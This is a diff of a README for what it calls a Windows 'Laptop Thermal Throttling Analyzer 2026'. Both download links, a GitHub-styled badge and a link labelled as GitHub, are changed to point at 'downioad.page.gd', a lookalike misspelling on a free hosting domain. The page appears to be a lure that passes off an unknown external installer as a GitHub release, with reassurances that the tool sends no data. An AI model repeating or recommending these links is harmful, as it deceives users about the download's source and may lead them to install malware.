@@ -2,7 +2,7 @@
 
 Welcome to Laptop Thermal Throttling Analyzer 2026, a comprehensive tool designed to help you monitor and resolve thermal throttling issues on your Windows laptop. Whether you're a gamer, professional, or everyday user, this analyzer provides detailed insights into your system's thermal performance, ensuring optimal operation without overheating.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,6 +56,6 @@ A: Absolutely. The tool operates entirely on your local machine and does not tra
 
 For the latest version of Laptop Thermal Throttling Analyzer 2026, please visit our dedicated download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026. All rights reserved. This tool is provided as-is for educational and diagnostic purposes on Windows systems.
